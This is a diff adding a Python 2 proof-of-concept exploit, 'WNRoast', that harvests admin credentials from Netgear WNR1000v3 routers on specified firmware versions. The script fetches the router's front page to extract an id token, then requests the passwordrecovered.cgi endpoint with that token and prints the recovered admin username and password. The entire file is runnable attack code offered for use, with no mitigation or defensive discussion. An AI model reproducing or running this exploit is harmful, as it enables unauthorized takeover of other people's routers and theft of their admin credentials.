@@ -1,0 +1,89 @@
+######################################################################################
+# WNRoast Version 1.0                                                                #
+# Netgear WNR1000v3 Credential Harvesting Exploit (Proof of Concept)                 #
+# Tested On Firmware Version(s): V1.0.2.60_60.0.86 (Latest) and V1.0.2.54_60.0.82NA  #
+# By: c1ph04                                                                         #
+#                                                                                    #
+# Not the prettiest, but I need to get this done before the baby wakes up            #
+######################################################################################
+
+import socket
+import urllib
+import urllib2
+import sys
+
+CRLF = "\r\n"
+
+request = [
+    "GET / HTTP/1.1",
+    "Host: none",
+    "Connection: Close",
+    "",
+    "",
+]
+#---------------------------------------------------
+
+s = socket.socket()
+s.connect((sys.argv[1], int(sys.argv[2])))
+
+s.send(CRLF.join(request))
+
+response = ''
+buffer = s.recv(4096)
+while buffer:
+    response += buffer
+    buffer = s.recv(4096)
+
+header_data, _, body = response.partition(CRLF + CRLF)
+
+#-----------------------------------------------------
+
+def extract_between(text, sub1, sub2, nth=1):
+
+    if sub2 not in text.split(sub1, nth)[-1]:
+        return None
+    return text.split(sub1, nth)[-1].split(sub2, nth)[0]
+
+text = body
+
+uid = (repr(extract_between(text, 'id=', '\"')))
+
+uid = uid.replace("\'", '')
+
+#-----------------------------------------------------
+
+# Send POST To Get Credentials
+
+ip = sys.argv[1]
+
+ip = ip.replace("\'", '')
+
+port = sys.argv[2]
+
+port = port.replace("\'", '')
+
+url = 'http://' + ip + ':' + port + '/passwordrecovered.cgi?id=' + uid
+
+data = ''
+req = urllib2.Request(url, data)
+response = urllib2.urlopen(req)
+the_page = response.read()
+
+#-------------------------------------------------------
+
+username = (repr(extract_between(the_page, 'Router Admin Username</td>', '</td>')))
+username = (repr(extract_between(username, '>', '\'')))
+username = username.replace("\'", '')
+
+password = (repr(extract_between(the_page, 'Router Admin Password</td>', '</td>')))
+password = (repr(extract_between(password, '>', '\'')))
+password = password.replace("\'", '')
+
+print """
+ WNRoast Version 1.0
+ =========================
+ By: c1ph04
+ """
+print "\n WNRoasted!\n"
+print " Username is: " + username + '\n'
+print " Password is: " + password
